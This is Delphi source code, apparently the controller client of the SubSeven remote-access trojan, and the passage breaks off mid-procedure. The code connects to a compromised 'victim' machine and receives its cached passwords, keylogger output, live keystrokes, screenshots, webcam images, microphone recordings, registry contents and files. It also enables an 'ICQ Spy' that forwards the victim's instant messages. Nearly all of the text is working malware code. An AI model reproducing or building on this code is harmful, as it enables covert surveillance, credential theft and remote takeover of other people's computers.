
unit Unit2;

interface

uses
  Buttons,Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ScktComp, ComCtrls, ExtCtrls, NMUDP, Psock, NMSTRM, ExtDlgs, inifiles,
  Mask, RXSpin, MMSystem, Gauges,winsock, NMHttp, RxGIF, ImgList, CoolForm,
  RXShell, Menus, NMMSG, RXCtrls ;

type
  TForm1 = class(TForm)
    ClientSocket: TClientSocket;
    Edit1: TEdit;
    Button1: TButton;
    Button2: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Button11: TButton;
    Button17: TButton;
    ListBox1: TListBox;
    Button18: TButton;
    Button19: TButton;
    Button20: TButton;
    Button21: TButton;
    Button22: TButton;
    Button23: TButton;
    Button25: TButton;
    OpenPictureDialog1: TOpenDialog;
    dir: TEdit;
    Button27: TButton;
    Button28: TButton;
    Button29: TButton;
    Button31: TButton;
    ListBox2: TListBox;
    Button34: TButton;
    Button35: TButton;
    Button36: TButton;
    Button37: TButton;
    Button38: TButton;
    Button39: TButton;
    Button40: TButton;
    Button46: TButton;
    Button47: TButton;
    Button48: TButton;
    listkey: TButton;
    Info: TLabel;
    progr: TGauge;
    OpenDialog1: TOpenDialog;
    Button52: TButton;
    port: TEdit;
    Button55: TButton;
    Button56: TButton;
    Button58: TButton;
    Button4: TButton;
    Button59: TButton;
    Button60: TButton;
    hidMemo: TMemo;
    nvMemo: TMemo;
    NMHTTP1: TNMHTTP;
    Button67: TButton;
    Button73: TButton;
    Button74: TButton;
    Button75: TButton;
    Button57: TButton;
    Button53: TButton;
    Button54: TButton;
    Button32: TButton;
    Button66: TButton;
    Button51: TButton;
    path: TLabel;
    Status: TLabel;
    RxTrayIcon1: TRxTrayIcon;
    PopupMenu1: TPopupMenu;
    openSub71: TMenuItem;
    aboutSub71: TMenuItem;
    quit1: TMenuItem;
    Button3: TButton;
    keyhook: TMemo;
    CheckBox1: TCheckBox;
    Button5: TButton;
    Button6: TButton;
    Label1: TLabel;
    keysock: TClientSocket;
    SpeedButton1: TSpeedButton;
    Label2: TLabel;
    ChatSock: TClientSocket;
    Image1: TImage;
    Button7: TButton;
    Label3: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Button12: TButton;
    Label4: TLabel;
    StopIt: TTimer;
    ICQSpyButton: TButton;
    ClientSocket1: TClientSocket;
    procedure FullCapture;
    procedure SaveINI(INISection,INIVar,INIVal:String);
    function  ReadIni(INISection,INIVar:String):String;
    procedure RefreshIT(sender:TObject);
    procedure DisableFTPServer;
    procedure EnableFTPServer(parola:string;portu,clienti:integer);
    procedure HandleErrors(Sender:TObject;E:Exception);
    procedure ClientSocketConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ShowPasswords(sender:TObject);
    procedure Button1Click(Sender: TObject);
{    procedure Button2Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);}
    procedure ClientSocketConnecting(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketLookup(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure UploadFile(bparam:boolean;Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure UpdateFileManager(Sender: TObject);
    procedure UpdateWinManager(Sender: TObject);
    procedure UpdateDrivers(Sender: TObject);
    procedure ListBox1DblClick(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure Button23Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Button25Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button27Click(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure NMStrm1PacketSent(Sender: TObject);
    procedure pathMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button28Click(Sender: TObject);
    procedure Button29Click(Sender: TObject);
    procedure dirMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button31Click(Sender: TObject);
    procedure Button34Click(Sender: TObject);
    procedure Button35Click(Sender: TObject);
    procedure Button37Click(Sender: TObject);
    procedure Button36Click(Sender: TObject);
    procedure Button38Click(Sender: TObject);
    procedure ceasTimer(Sender: TObject);
    procedure Button39Click(Sender: TObject);
    procedure Button40Click(Sender: TObject);
    procedure Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button8MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button31MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button10MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button9MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button25MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button11MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure icqMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button28MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button29MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure ListBox1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button17MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button18MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button38MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button40MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button22MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button23MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button19MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button20MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button21MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure ListBox2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button34MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button35MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button37MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button36MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button39MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button27MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure InfoMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure StatusBarMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label9MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button46MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button46Click(Sender: TObject);
    procedure Button47MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button47Click(Sender: TObject);
    procedure Button48Click(Sender: TObject);
    procedure listkeyClick(Sender: TObject);
    procedure listkeyMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button48MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure keyhookMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button51MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button51Click(Sender: TObject);
    procedure Button52MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button52Click(Sender: TObject);
    procedure portMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button53Click(Sender: TObject);
    procedure Button54Click(Sender: TObject);
    procedure Button55Click(Sender: TObject);
    procedure Button56MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button55MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button53MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button54MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button57Click(Sender: TObject);
    procedure Button57MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button56Click(Sender: TObject);
    procedure Button58Click(Sender: TObject);
    procedure Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button2Click(Sender: TObject);
    procedure Button58MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure stopbutClick(Sender: TObject);
    procedure Button59Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button60Click(Sender: TObject);
    procedure Button60MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button32Click(Sender: TObject);
    procedure Button66Click(Sender: TObject);
    procedure Button67Click(Sender: TObject);
    procedure Button67MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button73Click(Sender: TObject);
    procedure Button73MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button74MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button74Click(Sender: TObject);
    procedure Button75Click(Sender: TObject);
    procedure Button75MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Shape1DragDrop(Sender, Source: TObject; X, Y: Integer);
    procedure Label7Click(Sender: TObject);
    procedure CoolForm1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label7MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label14MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label14Click(Sender: TObject);
    procedure Label15Click(Sender: TObject);
    procedure Label15MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label16MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label16Click(Sender: TObject);
    procedure Label17Click(Sender: TObject);
    procedure Label17MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label18MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label18Click(Sender: TObject);
    procedure Label19Click(Sender: TObject);
    procedure Label19MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure RxTrayIcon1Click(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure RxTrayIcon1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button66MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button32MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure openSub71Click(Sender: TObject);
    procedure aboutSub71Click(Sender: TObject);
    procedure quit1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure keyhookChange(Sender: TObject);
    procedure Button5MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button5Click(Sender: TObject);
    procedure Button6MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button6Click(Sender: TObject);
    procedure keysockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure keysockError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Button59MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button4MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure ChatSockDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ChatSockError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ChatSockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button7MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button7Click(Sender: TObject);
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label6MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label10MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button12MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button12Click(Sender: TObject);
    procedure Label4Click(Sender: TObject);
    procedure Button3MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure StopItTimer(Sender: TObject);
    procedure ICQSpyButtonClick(Sender: TObject);
    procedure ICQSpyButtonMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
  private
    { Private declarations }
    NMStrm: TNMStrm;
    procedure WMNCHitTest(var M: TWMNCHitTest); message wm_NCHitTest;
  public
    UseMySettings:Boolean;
    NickName:String;
    MouseHook:HHook;
    MouseMsg:TNMMsg;
    procedure SetSub7Color(col: String);
    procedure SendMousePos(x, y: Integer);
    function SendSettings: string;
    function NotPassedVersionCheck(serverreq:string):boolean;
    procedure SendCommand(com,msg:string);
    procedure SetTransferON;
    procedure SetTransferandON;
    procedure RefreshFM;
    procedure Trimite(ce:string);
    procedure SetCaption(ince:string);
  end;

const
  htCaptionBtn = htSizeLast + 1;
  ClientVersion='1.9';
var
  transferand:boolean;
  Buffer: array [0..1024] of Char;
{ Buffer: array [0..9999] of Char;}
  ServerVersion:String;
  ServerAnswer,Connected:Boolean;
  fisier:file;
  Form1: TForm1;
  DriversLoaded,Refreshing,GetDrives,RECORDING,iale,Conectat,Done,InChat,Downloading,GettinInfo,Gettin:Boolean;
  CurrentHost:Integer;
  primiti,total,marime:Integer;
  InFile:Byte;
  ss:TFileStream;
  ListIndex:LongInt;
  MyStream:TMemoryStream;
  CaptureSize,atprogress,tmpint:LongInt;
  DownloadingFile,KeepConnectedIP:String;
  IsGetKeys,MouseOFF,getkeylog,ftpactive,Transfering,InTransfer:Boolean;
  StrmSaved:TStream;
const NotConnected='you need to connect first...';
implementation

uses Unit3, ListaUnit, dirunit, aboutbox, npath, showimage,
  ShowInformations, passunit, portscanunit, key_log_unit, ftpservunit, messageunit,
  SendKeyUnit, OptionsUnit, nvUnit, flipUnit, nonstopUnit, readregs,
  waitunit, FindUnit, Unit23, printUnit, EmailUnit, ResolutionUnit,
  PopKeyHookUnit, ClientsChatUnit, PickChatUnit, VictimChatUnit,
  SetSoundUnit, WebCamUnit, TimeDateUnit, ICQSpyUnit;
var sending:boolean;
{$R *.DFM}

function Merge(x,y:integer;lab:TLabel):Boolean;
begin
 if ((x>=Form1.Left+lab.Left) and (x<=Form1.Left+lab.Left+lab.Width))
  and ((y>=Form1.Top+lab.Top) and (y<=Form1.Top+lab.Top+lab.Height)) then result:=False
 else result:=True;
end;

function Merge2(x,y:integer;lab:TSpeedButton):Boolean;
begin
 if ((x>=Form1.Left+lab.Left) and (x<=Form1.Left+lab.Left+lab.Width))
  and ((y>=Form1.Top+lab.Top) and (y<=Form1.Top+lab.Top+lab.Height)) then result:=False
 else result:=True;
end;

procedure TForm1.WMNCHitTest(var M: TWMNCHitTest);
begin
  inherited;
 if (M.Result = HTCLIENT) and (Merge(m.xpos,m.ypos,Label3)) and (Merge(m.xpos,m.ypos,Label5)) and (Merge(m.xpos,m.ypos,Label6)) and (Merge2(m.xpos,m.ypos,SpeedButton1)) and
                              (Merge(m.xpos,m.ypos,Label7)) and (Merge(m.xpos,m.ypos,Label8)) and (Merge(m.xpos,m.ypos,Label9)) and (Merge(m.xpos,m.ypos,Label6)) and  (Merge(m.xpos,m.ypos,Label10)) and  (Merge(m.xpos,m.ypos,Label4)) then
   M.Result := htCaption;
end;

procedure TForm1.SetCaption(ince:String);
begin
 info.enabled:=true;
 info.caption:=ince;
end; 

procedure TForm1.SendCommand;
begin
if Conectat then begin
  ClientSocket.Socket.SendText(com);
  Status.Caption:=msg;
end else Status.Caption:=NotConnected;
end;

function TForm1.NotPassedVersionCheck(serverreq:string):boolean;
var doesntwork:boolean;
    bitcur,bitreq:array[1..2] of byte;
    showmsg:string;
begin
NotPassedVersionCheck:=false;
bitcur[1]:=StrToInt(copy(ServerVersion,1,1));
bitcur[2]:=StrToInt(copy(ServerVersion,3,1));
bitreq[1]:=StrToInt(copy(Serverreq,1,1));
bitreq[2]:=StrToInt(copy(Serverreq,3,1));
doesntwork:=false;
if (bitcur[2]<bitreq[2]) then doesntwork:=true;
if doesntwork then
 begin
  showmsg:='the server needs to be updated to version: '+serverreq+' before using that feature. the current version of the server is: '+ServerVersion;
  if ServerVersion='1.0' then showmsg:=showmsg+' or 1.1';
  ShowMessage(showmsg);
  NotPassedVersionCheck:=true;
 end;
end;

procedure TForm1.HandleErrors;
begin
 {Status.Caption:='ERROR: '+E.ClassName+'. '+E.Message;}
end;

function TForm1.ReadIni(INISection,INIVar:String):String;
var MyStr:String;
    MyINI:TIniFile;
begin
 MyIni := TIniFile.Create('subseven.ini');
 with MyIni do MyStr := ReadString(IniSection,INIVar,'ERROR');
 MyIni.Free;
result:=MyStr;
end;
Procedure TForm1.SaveIni(INISection,INIVar,INIVal:String);
var MyIni: TIniFile;
begin;
 MyIni := TIniFile.Create('subseven.ini');
 with MyIni do WriteString(INISection,INIVar,INIVal);
 MyIni.Free;
end;


procedure TForm1.ClientSocketConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
{ Status.Caption:='connected. waiting for server info...';}
 Button1.Caption:='disconnect';
 Conectat:=True;
 ServerAnswer:=True;
 Connected:=True;
 UseMySettings:=False;
end;

procedure TForm1.ClientSocketDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 ICQSpyForm.ICQSpySocket.Active:=False;
 Status.Caption:='fukin'' shit! disconnected! :(';
 try keysock.active:=false;except end;
 Conectat:=False;Button1.Caption:='connect';
 Refreshing:=False;
 Gettin:=False;
 Downloading:=False;
 GettinInfo:=False;
 GetDrives:=False;
 RECORDING:=False;
 InTransfer:=False;
 Transfering:=False;
 ftpactive:=false;
 getkeylog:=false;
 iale:=false;
 DriversLoaded:=False;
 IsGetKeys:=False;
 try keysock.active:=false;except end;
 listkey.Caption:='on';
end;

procedure TForm1.ClientSocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
var ssize,s,TmpStr:string;
    MemoWnd : HWnd;
    primeste:array[1..10] of string[3];
    no,i:integer;
{    IsDRVDONE:Boolean;}
    Stream:TMemoryStream;
    nReceived,totalrecv,total: Integer;
    loop:integer;
{    Time1: Cardinal;}
    undesalveaza,StrIn,totalbytes:String;
    Tip,ii:Integer;
    evreuna:boolean;
    cheie:string;
begin
if Transferand then
begin
  if dir.text='<default>' then undesalveaza:=ExtractFilePath(ParamStr(0))+'\' else undesalveaza:=dir.text+'\';
  for tip:=1 to 10 do primeste[tip]:='NTF';
  primeste[1]:='NTF';
  primeste[2]:='CSS';
  primeste[3]:='GPW';
  primeste[4]:='RSF';
  primeste[5]:='GOK';
  primeste[6]:='RSH';
  primeste[7]:='LT1';
  primeste[8]:='LOF';
  primeste[9]:='WCC';
  Socket.ReceiveBuf (Buffer, 5);
  strIn := Copy (Buffer, 1, 5);
  if strIn='path ' then begin Status.Caption:='path not found';transferand:=false;exit;end;
  evreuna:=false;
  for tip:=1 to 10 do if copy(strin,1,3)=primeste[tip] then evreuna:=true;
  {if copy(strin,1,3)= primeste then exit;}
  if not evreuna then exit;
  if copy(strin,1,3)='NTF' then tip:=1;
  if copy(strin,1,3)='CSS' then tip:=2;
  if copy(strin,1,3)='GPW' then tip:=3;
  if copy(strin,1,3)='RSF' then tip:=4;
  if copy(strin,1,3)='GOK' then tip:=5;
  if copy(strin,1,3)='RSH' then tip:=6;
  if copy(strin,1,3)='LT1' then tip:=7;
  if copy(strin,1,3)='LOF' then tip:=8;
  if copy(strin,1,3)='WCC' then tip:=9;
  if tip=8 then
   with waitform do begin
    label1.caption:='transfering. please wait...';
    bevel1.height:=bevel1.height+21;
    height:=height+21;
    refresh;
   end;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Buffer, 1);
    strIn := Copy (Buffer, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
  total:=StrToInt(totalbytes);
 case tip of
  1:Status.Caption:='downloading '+downloadingfile+' ('+totalbytes+' bytes)';
  2:Status.Caption:='receiving screen shot...';
  3:Status.Caption:='receiving catched passwords...';
  4:Status.Caption:='receiving recorded sound file...';
  5:Status.Caption:='receiving offline pressed keys...';
  6:Status.Caption:='receiving directory...';
  9:Status.Caption:='receiving webcam screenshot...';
 end;
 if (tip=7) or (tip=8) then
 begin
  waitform.progr1.maxvalue:=total;
  waitform.progr1.minvalue:=0;
  waitform.progr1.progress:=0;
 end else begin
  progr.maxvalue:=total;
  progr.minvalue:=0;
  progr.progress:=0;
 end;
 Stream := TMemoryStream.Create;
 totalrecv:=0;
 try
  while (totalrecv<total) do begin
   if (not Conectat) then begin {showmessage('connection lost');}transferand:=false;exit;end;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
    if (tip in [7,8]) then waitform.progr1.progress:=totalrecv else
     progr.progress:=totalrecv;
   end;
{   Application.ProcessMessages;}
  end;
  Stream.Position := 0;
  case tip of
   1:Stream.SaveToFile(undesalveaza+DownloadingFile);
   2:begin
      Status.Caption:='capture complete!';
      Stream.SaveToFile(undesalveaza+'desktop.jpg');
      inc(tmpint);
      ShowImg.Tag:=1;
      ShowImg.Enabled:=True;
      ShowImg.Edit1.Text:='duh'+IntToStr(tmpint);
      Form1.Enabled:=False;
      ShowImg.Show;
     end;
   3:begin
      Status.Caption:='passwords retrieved.';
      Stream.SaveToFile(undesalveaza+'temp.dat');
      pass.name.clear;
      pass.box.clear;
      pass.show;
     end;
   4:begin
      Status.Caption:='recorded file received [saved as: soundfile.wav]';
      Stream.SaveToFile(undesalveaza+'soundfile.wav');
      sndPlaySound(PChar(undesalveaza+'soundfile.wav'),Snd_Sync);
     end;
   5:begin
      Status.Caption:='keys retrieved.';
      keylogunit.memo1.lines.clear;
      KeyLogUnit.Memo1.Lines.LoadFromStream(Stream);
      KeyLogUnit.Show;
     end;
   6:begin
      ListBox1.Items.Clear;
      ListBox1.Items.LoadFromStream(Stream);
      Status.Caption:='finished refreshing.';
     end;
   7:begin
      regForm.ListBox1.Items.Clear;
      regForm.ListBox2.Items.Clear;
      regForm.ListBox3.Sorted:=False;
      regForm.ListBox3.Items.Clear;
      regForm.ListBox1.Sorted:=True;
      regForm.ListBox2.Sorted:=True;
      regForm.ListBox3.Items.LoadFromStream(Stream);
      for i:=1 to regForm.ListBox3.items.count do
       if regForm.ListBox3.items[i-1]<>'/despartitura' then
        regForm.ListBox1.items.add(regForm.ListBox3.items[i-1])
       else break;
      if i<>regForm.ListBox3.items.count then
      for ii:=i+1 to regForm.ListBox3.items.count do
       regForm.ListBox2.items.add(regForm.ListBox3.items[ii-1]);
      RegForm.AddSauNu;
      waitform.modalresult:=5;
      waitform.close;
     end;
   8:begin
      findForm.ListBox1.Items.LoadFromStream(Stream);
      waitform.modalresult:=5;
      waitform.close;
     end;
   9:begin
      Status.Caption:='capture complete!';
      Stream.SaveToFile(undesalveaza+'webcam.jpg');
      inc(tmpint);
      ShowImg.Tag:=2;
      ShowImg.Enabled:=True;
      ShowImg.Edit1.Text:='duh'+IntToStr(tmpint);
      Form1.Enabled:=False;
      ShowImg.Show;
     end;
  end;
 finally
  Stream.Free;
 end;
 if tip=1 then Status.Caption:='download complete.';
 Transferand:=False;
 progr.progress:=0;
 waitform.progr1.progress:=0;
 progr.progress:=0;
 exit;
end;

s:=Socket.ReceiveText;
if s='ICQ Spy© enabled!' then
 begin
  ICQSpyForm.ICQSpySocket.Address:=Form1.ClientSocket.Address;
  ICQSpyForm.ICQSpySocket.Active:=True;
  ICQSpyForm.button4.caption:='disable';
  showmessage('ICQ Spy© is now enabled. '#13#10'as the victim receives messages, wwpagers or urls on icq, they will be sent to you.');
 end else
if s='key press listen enabled' then
 begin
  keysock.Port:=2773;
  keysock.Address:=Form1.ClientSocket.Address;
  try keysock.Active:=True;except end;
  IsGetKeys:=True;
  listkey.Caption:='off';
 end else
if copy(s,1,6)='file: ' then RefreshFM;
if copy(s,1,3)='RRD' then begin
 with waitform do begin
  close;
  bevel1.height:=bevel1.height+21;
  height:=height+21;
 end;
 regForm.DataReceived(copy(s,4,length(s)));
 exit;
end else
if copy(s,1,5)='VRead' then
 with SetSoundForm do begin
  WaveBar.Position:=StrToInt(copy(s,6,3));
  WaveBar.Enabled:=True;
  SynthBar.Position:=StrToInt(copy(s,9,3));
  SynthBar.Enabled:=True;
  CDBar.Position:=StrToInt(copy(s,12,3));
  CDBar.Enabled:=True;
  Stat.Caption:='settings read.';
  exit;
 end else
if copy(s,1,3)='RTD' then begin Status.Caption:='done.';TimeDate.DataReceived(copy(s,4,length(s)));exit;end; 
if copy(s,1,4)='VSet' then begin SetSoundForm.Stat.Caption:='volume set.';exit;end else 
if copy(s,1,3)='RAW' then
 begin
  strin:=copy(s,4,length(s));
  ListBox2.Sorted:=False;
  ListBox2.Items.Clear;
  ListBox2.Items.Text:=strin;
  if SendKeyForm.Active then
   SendKeyForm.UpdateTheList(true)
  else
   SendKeyForm.UpdateTheList(false);
  Status.Caption:='done.';
  exit;
 end;
if copy(s,1,3)='GMI' then
 begin
  strin:=copy(s,4,length(s));
  hidMemo.Lines.clear;
  hidMemo.Lines.text:=strin;
  with ShowInfo,hidMemo do begin
   Label13.Caption:=lines[0];
   Label14.Caption:=lines[1];
   Label15.Caption:=lines[2];
   Label16.Caption:=lines[3];
   Label17.Caption:=lines[4];
   Label18.Caption:=lines[5];
   Label19.Caption:=lines[6];
   Label21.Caption:=lines[8];
   Label22.Caption:=lines[9];
   Label23.Caption:=lines[10];
   Label24.Caption:=lines[11];
   Label26.Caption:=lines[12];
   Label27.Caption:=lines[13];
   Label28.Caption:=lines[14];
   if copy(lines[6],length(lines[6])-6,4)='1998' then
    Label20.Caption:='Windows 98'
   else
    Label20.Caption:=lines[8];
   end;
  Status.Caption:='info retrieved.';
  showinfo.show;
  exit;
 end;
if copy(s,1,3)='GDR' then
 begin
  strin:=copy(s,4,length(s));
  GetNewPath.ListDrives.Items.Text:=strin;
  Status.Caption:='drives received.';
  GetNewPath.Show;
  exit;
 end;
if copy(s,1,3)='CRS' then
 begin
  strin:=copy(s,4,length(s));
  ResolutionForm.ListBox1.Items.Text:=strin;
  Status.Caption:='allowed resolutions received.';
  ResolutionForm.Show;
  exit;
 end;
if copy(s,1,3)='PSS' then
 begin
  strin:=copy(s,4,length(s));
  Pass.Memo1.Lines.Text:=strin;
  Pass.Memo1.Visible:=true;
  Pass.Show;
  exit;
 end;

if (s='PWD') or (pos(s,'PWD')<>0) or (s='error reading password...') then
 begin
  Status.Caption:='woops. looks like the server is password protected...';
  If InputQuery('the server is password protected.', 'password: ', TmpStr) then
   begin
    if TmpStr<>IntToStr(no) then
     ClientSocket.Socket.SendText('PWD'+TmpStr)
    else ClientSocket.Socket.SendText(IntToStr(no));
   end;
  if s='PWD' then exit;
 end;
if pos(s,'PWD')<>0 then delete(s,pos(s,'PWD'),3);
if copy(s,1,10)='connected.' then
 begin
  Status.Caption:=s;
  ServerVersion:='1.0';
  ServerVersion:=copy(s,length(s)-2,3);
  exit;
 end;
if copy(s,1,5)='POPUP' then
begin
 ShowMessage(copy(s,6,length(s)));
 exit;
end;
if copy(s,1,5)='ERROR' then
begin
 Refreshing:=False;
 Gettin:=False;
 Downloading:=False;
 GettinInfo:=False;
 GetDrives:=False;
 RECORDING:=False;
 InTransfer:=False;
 Transfering:=False;
 ftpactive:=false;
 getkeylog:=false;
 iale:=false;
 DriversLoaded:=False;
 IsGetKeys:=False;
end;
no:=715;
loop:=0;
repeat
inc(loop);
if s[loop]=';' then begin
  if (s[loop+1]<>'ô') and (s[loop+1]<>'ö') and (s[loop+1]<>'ò') and (s[loop+1]<>'û') then
    begin
     SendMessage(KeyHook.Handle, WM_CHAR, Byte(s[loop+1]), 0);
     SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, Byte(s[loop+1]), 0);
    end
  else if s[loop+1]='ô' then
    begin
     SendMessage(KeyHook.Handle, WM_CHAR, Byte(' '), 0);
     SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, Byte(' '), 0);
    end
  else if s[loop+1]='ö' then
    begin
     SendMessage(KeyHook.Handle, WM_CHAR, VK_RETURN, 0);
     SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, VK_RETURN, 0);
    end
  else if s[loop+1]='ò' then
    begin
     SendMessage(KeyHook.Handle, WM_CHAR, Byte(#8), 0);
